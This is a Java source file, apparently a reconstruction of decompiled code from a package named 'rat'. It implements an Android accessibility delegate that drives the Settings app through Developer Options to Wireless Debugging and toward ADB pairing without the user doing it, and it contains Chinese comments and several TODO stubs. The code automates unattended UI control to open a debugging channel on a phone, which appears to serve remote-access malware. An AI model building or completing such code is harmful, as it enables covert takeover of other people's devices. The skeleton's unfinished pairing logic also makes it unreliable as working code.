package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.BoolCondition;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.TextConfig;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 无线调试配对自动化代理
 *
 * Vendor: o/a0.java (2003 行, extends e)
 * 功能: 自动导航到开发者选项→无线调试→配对
 *       支持多厂商开发者选项界面
 *       120/180 秒超时自动结束
 *
 * 字段对齐:
 *   f601n → pairScheduler (ScheduledExecutorService)
 *   f602o → processedActions (ConcurrentLinkedQueue)
 *   f603p → pairState (AtomicReference, PAIR_DEPT_*)
 *   q     → pairLock (ReentrantLock)
 *   f604r → finished (AtomicBoolean)
 *   f605s → usbDebuggingEnabled (boolean)
 *   f606t → wirelessDebuggingEnabled (boolean)
 *   f607u → pairCompleted (boolean)
 */
public class PairAccessibilityDelegate extends AutoEngine {

    private static final String TAG = "PairAccessibilityDelegate";
    private static final String SETTINGS = "com.android.settings";
    private static final String SYSTEM_UI = "com.android.systemui";

    // 状态常量 — ADAPT: r.g enum
    public static final String STATE_UNKNOWN = "PAIR_DEPT_UNKNOWN";
    public static final String STATE_ENTER_DEV_OPT = "ENTER_DEV_OPTION";
    public static final String STATE_FIND_WIRELESS = "FIND_WIRELESS_DEBUG";
    public static final String STATE_ENTER_WIRELESS = "ENTER_WIRELESS_DEBUG";
    public static final String STATE_PAIR_DIALOG = "PAIR_DIALOG";
    public static final String STATE_PAIR_SUCCESS = "PAIR_SUCCESS";
    public static final String STATE_PAIR_FAIL = "PAIR_FAIL";

    // ADAPT: f601n → pairScheduler
    public final ScheduledExecutorService pairScheduler;

    // ADAPT: f602o → processedActions
    public final ConcurrentLinkedQueue<String> processedActions;

    // ADAPT: f603p → pairState
    public final AtomicReference<String> pairState;

    // ADAPT: q → pairLock
    public final ReentrantLock pairLock;

    // ADAPT: f604r → pairFinished
    public final AtomicBoolean pairFinished;

    // ADAPT: f605s, f606t, f607u → 状态标志
    public boolean usbDebuggingEnabled;
    public boolean wirelessDebuggingEnabled;
    public boolean pairCompleted;

    public PairAccessibilityDelegate() {
        super(createListenWindows(), SETTINGS);
        ScheduledExecutorService ses = Executors.newSingleThreadScheduledExecutor();
        this.pairScheduler = ses;
        this.processedActions = new ConcurrentLinkedQueue<>();
        this.pairState = new AtomicReference<>(STATE_UNKNOWN);
        this.pairLock = new ReentrantLock();
        this.pairFinished = new AtomicBoolean(false);
        this.usbDebuggingEnabled = false;
        this.wirelessDebuggingEnabled = false;
        this.pairCompleted = false;
        try {
            long timeout = DeviceUtils.isOppo() ? 180L : 120L;
            ses.schedule(() -> handleTimeout(), timeout, TimeUnit.SECONDS);
            ses.schedule(() -> handleRetry(), 30L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule error", e);
        }
    }

    // ============ 静态窗口构建 ============

    /** ADAPT: E0() → createListenWindows */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        // 开发者选项主界面
        list.add(new WindowMatcher(SETTINGS,
                "com.android.settings.Settings$DevelopmentSettingsDashboardActivity")
                .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS,
                "com.android.settings.Settings$DevelopmentSettingsActivity")
                .addEventType(32).addEventType(16384));
        // SubSettings
        list.add(new WindowMatcher(SETTINGS, "com.android.settings.SubSettings")
                .addEventType(32).addEventType(16384));
        // 荣耀 SubSettings
        list.add(new WindowMatcher(SETTINGS, "com.hihonor.settingslib.SubSettings")
                .addEventType(32).addEventType(16384));
        // FrameLayout
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
                .addEventType(32).addEventType(16384));
        // systemui Dialog (配对对话框)
        list.add(new WindowMatcher(SYSTEM_UI, "android.app.Dialog")
                .addEventType(32).addEventType(16384).addEventType(1));
        // settings 通用
        list.add(new WindowMatcher(SETTINGS)
                .addEventType(32).addEventType(16384));
        return list;
    }

    // ============ 静态过滤器 ============

    /** ADAPT: T() → createClickableFilter */
    public static CombineFilter createClickableFilter() {
        return CombineFilter.and(new BoolCondition(BoolCondition.Property.CLICKABLE, true));
    }

    /** ADAPT: V() → createSwitchFilter */
    public static CombineFilter createSwitchFilter() {
        return CombineFilter.or(
                StringCondition.className("android.widget.Switch"),
                StringCondition.className("android.widget.ToggleButton"));
    }

    // ============ 配置文本过滤器 ============

    /** ADAPT: G0(scrollable) → findWirelessDebugEntry */
    public UiNode findWirelessDebugEntry(UiNode scrollable) {
        CombineFilter filter = buildTextViewFilter("PAIR_WIRELESS_DEBUG_TEXT");
        if (filter == null) return null;

        UiNode root = k();
        if (root == null) return null;

        UiNode node = root.findOneByCombine(filter);
        if (node == null && scrollable != null) {
            node = scrollable.scrollForwardUntil(filter);
            if (node == null) {
                node = scrollable.scrollBackwardUntil(filter);
            }
        }
        return node;
    }

    // ============ 窗口检测 ============

    /** ADAPT: L() → isInDevOptionWindow */
    public boolean isInDevOptionWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(new WindowMatcher(SETTINGS,
                "com.android.settings.Settings$DevelopmentSettingsDashboardActivity"));
        list.add(new WindowMatcher(SETTINGS,
                "com.android.settings.Settings$DevelopmentSettingsActivity"));
        return matchesAny(list);
    }

    // ============ 执行入口 ============

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // ADAPT: 由 onAccessibilityEvent 状态机驱动
    }

    // ============ 核心逻辑骨架 ============

    /**
     * ADAPT: H(a0) → handleDevOptionWindow
     * 在开发者选项中查找无线调试并点击
     * // TODO: VENDOR_VERIFY - 原始反编译部分失败
     */
    public void handleDevOptionWindow() {
        if (!isInDevOptionWindow()) return;

        Log.d(TAG, "pairInDevOption 窗口匹配");
        updateProgress(10);
        activateRoot();
        Log.d(TAG, "active root complete");

        UiNode scrollable = getScrollableNode();
        if (scrollable == null) {
            Log.e(TAG, "开发者选项窗口滚动视图未找到");
            return;
        }
        Log.d(TAG, "开发者选项窗口滚动视图查找成功");

        // 查找无线调试入口
        UiNode wirelessEntry = findWirelessDebugEntry(scrollable);
        if (wirelessEntry == null) {
            Log.e(TAG, "无线调试栏目未找到");
            return;
        }

        Log.d(TAG, "无线调试栏目查找成功:" + wirelessEntry);

        // 查找可点击父节点
        UiNode clickable = wirelessEntry.findParentUntil(createClickableFilter());
        if (clickable == null) {
            Log.e(TAG, "无线调试可点击栏目未找到");
            return;
        }

        Log.d(TAG, "无线调试可点击栏目查找成功");
        updateProgress(15);

        // 点击进入无线调试
        clickable.click();
        pairState.set(STATE_FIND_WIRELESS);
    }

    /**
     * ADAPT: 配对对话框处理
     * // TODO: VENDOR_VERIFY - 需要完整实现配对码输入逻辑
     */
    public void handlePairDialog() {
        // ADAPT: vendor 在 systemui Dialog 中查找配对码输入框
        // 输入配对码并点击配对按钮
        Log.d(TAG, "处理配对对话框");
        // TODO: VENDOR_VERIFY - 需要集成配对码获取和输入逻辑
    }

    // ============ 超时/重试 ============

    private void handleTimeout() {
        Log.d(TAG, "配对超时");
        pairState.set(STATE_PAIR_FAIL);
        finishPair();
    }

    private void handleRetry() {
        // ADAPT: vendor case 1 in Runnable z
        // TODO: VENDOR_VERIFY
    }

    private void finishPair() {
        try {
            pairScheduler.shutdownNow();
            processedActions.clear();
            super.destroy();
        } catch (Exception e) {
            Log.e(TAG, "finishPair error", e);
        }
    }

    // ============ 生命周期 ============

    @Override
    public void destroy() {
        finishPair();
        super.destroy();
    }

    // ============ 事件处理状态机 ============

    /**
     * ADAPT: u() → onAccessibilityEvent
     * // TODO: VENDOR_VERIFY - vendor 有非常复杂的状态机 (2003行)
     * 此处为骨架实现，需要逐步补全
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        super.onAccessibilityEvent(event, packageName, className);

        String state = pairState.get();

        // 状态机分发
        if (STATE_UNKNOWN.equals(state) || STATE_ENTER_DEV_OPT.equals(state)) {
            if (processedActions.contains("pairInDevOption")) return;
            processedActions.add("pairInDevOption");
            handleDevOptionWindow();
        }

        if (STATE_FIND_WIRELESS.equals(state) || STATE_ENTER_WIRELESS.equals(state)) {
            // ADAPT: vendor 处理无线调试开关和配对
            // TODO: VENDOR_VERIFY - 需要完整实现
        }

        if (STATE_PAIR_DIALOG.equals(state)) {
            handlePairDialog();
        }

        // ADAPT: vendor 还有 PAIR_FAILED 重试逻辑
        // TODO: VENDOR_VERIFY
    }

    // ============ singleton pattern ============

    @Override
    public boolean equals(Object obj) { return obj instanceof PairAccessibilityDelegate; }

    @Override
    public int hashCode() { return Objects.hash(PairAccessibilityDelegate.class.getName()); }
}
